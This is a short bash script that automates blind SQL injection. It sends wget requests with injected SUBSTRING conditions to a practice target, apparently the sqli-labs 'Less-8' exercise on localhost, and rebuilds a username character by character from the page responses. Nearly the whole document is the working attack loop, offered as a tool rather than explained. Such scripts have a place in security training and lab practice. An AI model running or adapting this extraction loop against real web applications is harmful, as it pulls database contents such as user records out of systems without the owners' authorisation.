#!/usr/bin/env bash

#Extract data using blind sql injection technique

host="http://sqli.localhost"
query="Less-8/?id=1"
inject="'"

url="$host/$query$inject"
number_of_tries=$(seq 1 20)
spec_chars="\. \: \, \; \- \_ \@"
characters=`echo {0..9} {A..z} $spec_chars`

sql_query="select username from users where id = 1"

positive_match="You are in..........."
result=""


echo -e "[+] Blind SQL injection in progress"

for i in $number_of_tries
  do
    for j in $characters
    do
      wget "$url and SUBSTRING(($sql_query), $i, 1)=$inject$j" -q -O - | grep "$positive_match" &>/dev/null
      if [ "$?" == "0" ];then
        result=$result$j
        echo  -e "Found character:" $j
        break
      fi
    done
done

if [ "$result" ]
then
  echo -e "\n[+] Data for SQL query: '$sql_query' \n"
  echo "[+] Response: $result"
else
  echo "[-] Not vulnerable to SQL injection"
fi
